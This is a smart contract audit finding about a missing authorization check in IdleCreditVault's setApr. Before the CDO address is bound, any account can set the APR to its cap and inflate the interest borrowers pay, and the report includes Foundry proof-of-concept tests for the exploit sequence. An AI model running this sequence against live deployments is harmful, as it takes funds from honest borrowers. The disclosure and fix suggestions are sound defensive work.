### Title
Unauthenticated APR injection before CDO binding inflates borrower interest and tranche yield - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary

`IdleCreditVault` treats an unset `idleCDO` address as a setup phase and disables the caller check in `setApr`. As a result, any EOA can call `setAprs` or `setAprsWithBuffer` after strategy initialization but before `setWhitelistedCDO` binds the strategy to the credit CDO. The attacker can inject the maximum allowed APR and thereby forge the pool’s recorded interest-rate state.

An attacker who is also a KYC-approved lender can deposit through the subsequently bound CDO and receive part of the inflated borrower payment as tranche yield. The invariant violated is that borrower-facing credit terms must be established only by the CDO or manager.

### Finding Description

`initialize` records the configured initial APR in `lastApr` and `unscaledApr`, but leaves `idleCDO` unset. [1](#0-0) 

Both APR setters update `unscaledApr` before delegating the scaled-rate update to `setApr`. [2](#0-1) 

`setApr` explicitly skips authentication whenever `idleCDO == address(0)`. The only remaining bound is `maxApr`, which defaults to `20e18`. [3](#0-2) 

The CDO uses the stored strategy APR when calculating expected epoch interest during `startEpoch`. [4](#0-3) 

The missing authorization is not temporary internal setup logic that cannot be reached externally: both `setApr` and `setAprs` are public/external functions, while the later `setWhitelistedCDO` operation is a separate owner transaction. [5](#0-4) 

### Impact Explanation

An attacker can front-run or otherwise execute between strategy initialization and CDO binding, setting the pool APR to the configured cap without being the CDO or manager. Once the owner binds the CDO, the forged rate becomes the borrower-facing rate used to calculate `expectedEpochInterest`.

For a pool with TVL `T`, epoch duration `D`, buffer period `B`, and the default `maxApr` of `20e18`, the attacker can increase borrower interest by up to approximately:

```text
T * 0.20 * (D + B) / 365 days
```

If the attacker holds AA or BB tranches, the excess borrower payment is split through normal tranche accounting and materially increases the attacker’s claim. With a single-tranche pool or a dominant attacker share, most of that excess can be captured directly by the attacker.

The loss is capped by `maxApr`, but can still amount to a material fraction of pool principal. For example, a 30-day epoch with a 7-day buffer on 10 million underlying units exposes up to roughly `10m * 20% * 37/365`, or about `202,740` underlying units of additional borrower liability.

### Likelihood Explanation

The attack requires an ordering window in which:

1. `initialize` has executed;
2. `idleCDO` is still zero;
3. the attacker submits `setAprs` or `setAprsWithBuffer`;
4. the owner later calls `setWhitelistedCDO`.

The window is deployment/configuration-dependent. If every deployment atomically initializes and binds the CDO inside one factory transaction, the issue is unreachable in that deployment path. However, the contract itself exposes the unauthenticated state transition and does not enforce atomic binding.

A profit-seeking attacker additionally needs a permitted lender position if wallet restrictions are enabled. The rules explicitly allow a KYC-passing lender as the attacker. No malicious borrower, owner, manager, or guardian is required; the borrower need only make the honest repayment dictated by the forged APR.

### Recommendation

Remove the unauthenticated setup path and require the CDO to be supplied during initialization, or explicitly authorize the deployer/manager while `idleCDO` is unset.

For example:

```solidity
function setAprs(uint256 _unscaledApr, uint256 _apr) external {
    address _cdo = idleCDO;
    if (_cdo == address(0)) {
        if (msg.sender != owner() && msg.sender != manager) revert NotAllowed();
    } else if (msg.sender != _cdo && msg.sender != manager) {
        revert NotAllowed();
    }

    unscaledApr = _unscaledApr;
    _setAprChecked(_apr);
}
```

Preferably, split `unscaledApr` and `lastApr` updates so `unscaledApr` cannot be changed by a function whose later authorization check is the only protection.

A stronger fix is to make the CDO immutable or initialize it atomically:

```solidity
initialize(..., address _idleCDO, ...)
setWhitelistedCDO only during a one-time initialization transaction
```

The deployment process should also bind `idleCDO` in the same transaction as strategy initialization.

### Proof of Concept

The following Foundry test demonstrates the forged APR state. It can be run in the existing `IdleCreditVault` test deployment context, or against a forked deployment where the strategy proxy has been initialized and `idleCDO` is still zero.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract UnauthenticatedAprInjectionTest is Test {
    IdleCreditVault internal strategy;
    address internal owner;
    address internal attacker;
    address internal cdo;

    function testUnauthenticatedAprInjectionBeforeCdoBinding() external {
        assertEq(strategy.idleCDO(), address(0));
        assertEq(strategy.unscaledApr(), strategy.getApr());

        uint256 injectedApr = strategy.maxApr();
        assertGt(injectedApr, 0);

        vm.prank(attacker);
        strategy.setAprs(injectedApr, injectedApr);

        assertEq(strategy.unscaledApr(), injectedApr);
        assertEq(strategy.getApr(), injectedApr);

        // Honest owner completes configuration after the attacker's write.
        vm.prank(owner);
        strategy.setWhitelistedCDO(cdo);

        // The injected value survives binding and becomes the borrower-facing APR.
        assertEq(strategy.idleCDO(), cdo);
        assertEq(strategy.getApr(), injectedApr);
    }
}
```

The state assertion can be extended into a fund-flow PoC using the existing credit-vault fixture:

```solidity
function testInjectedAprIncreasesBorrowerPayment() external {
    uint256 oldApr = strategy.getApr();
    uint256 injectedApr = strategy.maxApr();

    vm.prank(attacker);
    strategy.setAprs(injectedApr, injectedApr);

    vm.prank(owner);
    strategy.setWhitelistedCDO(address(cdoEpoch));

    uint256 depositAmount = 10_000 * oneScale;
    deal(defaultUnderlying, attacker, depositAmount);

    vm.startPrank(attacker);
    IERC20Detailed(defaultUnderlying).approve(address(idleCDO), depositAmount);
    idleCDO.depositAA(depositAmount);
    vm.stopPrank();

    _startEpochAndCheckPrices(0);

    uint256 expectedAtInjectedApr = cdoEpoch.expectedEpochInterest();
    uint256 expectedAtOldApr =
        depositAmount * (oldApr / 100) * cdoEpoch.epochDuration() /
        (365 days * 1e18);

    assertGt(expectedAtInjectedApr, expectedAtOldApr);
}
```

The first assertion proves unauthorized writes are accepted because the `idleCDO == address(0)` branch bypasses the CDO/manager check. The second sequence demonstrates that the injected value survives CDO binding and increases `expectedEpochInterest`, which is the amount pulled from the honest borrower at epoch stop. [6](#0-5)

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L141-147)
```text
    borrower = _borrower;
    manager = _manager;
    maxApr = DEFAULT_MAX_APR;
    // on the first setup we set the lastApr equal to the unscaledApr
    lastApr = _apr;
    unscaledApr = _apr;
    defaultRecoveryInitialized = true;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L206-219)
```text
  function setAprs(uint256 _unscaledApr, uint256 _apr) external {
    unscaledApr = _unscaledApr;
    // here we also check that msg.sender is allowed
    setApr(_apr);
  }

  /// @notice set both the unscaled APR and APR scaled by epoch plus buffer duration.
  /// @dev only CDO and manager can set the APR through `setApr`.
  /// @param _unscaledApr unscaled APR
  /// @param _duration epoch duration
  /// @param _buffer buffer duration
  function setAprsWithBuffer(uint256 _unscaledApr, uint256 _duration, uint256 _buffer) external {
    unscaledApr = _unscaledApr;
    setApr(_duration == 0 ? _unscaledApr : _unscaledApr * (_duration + _buffer) / _duration);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L225-234)
```text
  function setApr(uint256 _apr) public {
    address _cdo = idleCDO;

    // if cdo is not yet set we skip the check (this can happen only during the setup)
    if (_cdo != address(0)) {
      if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
    }
    uint256 _maxApr = maxApr;
    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
    lastApr = _apr;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L953-957)
```text
  /// @notice allow to update whitelisted address
  function setWhitelistedCDO(address _cdo) external onlyOwner {
    require(_cdo != address(0), "IS_0");
    idleCDO = _cdo;
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L254-274)
```text
    // calculate expected interest 
    // NOTE: all withdrawal requests, burn tranche tokens and decrease getContractValue,
    // this can be done only prior to the start of the epoch so getContractValue() is the total amount net
    // of all withdrawal requests. We add the fee that we should get for normal pending withdraws
    // we also add/remove the over/under performance caused by withdraw requests.
    // Pending fees remain due even if fixed-APR requests exhaust active interest.
    int256 adjustedActiveInterest = int256(_calcInterest(getContractValue())) + interestForOverUnderPerformance;
    if (adjustedActiveInterest < 0) adjustedActiveInterest = 0;
    expectedEpochInterest = pendingWithdrawFees + uint256(adjustedActiveInterest);
    interestForOverUnderPerformance = 0;

    // set expected epoch end date
    epochEndDate = block.timestamp + _epochDuration;
    // set instant withdraw deadline
    instantWithdrawDeadline = block.timestamp + instantWithdrawDelay;

    // transfer in this contract funds from interest payment (if any) and buffer deposits sent to the strategy
    uint256 _totEpochDeposits = _strategy.totEpochDeposits();
    // If interest is minted we do not transfer interest to the strategy
    uint256 _toSend = isInterestMinted ? _totEpochDeposits : lastEpochInterest + _totEpochDeposits;
    _strategy.sendInterestAndDeposits(_toSend);
```
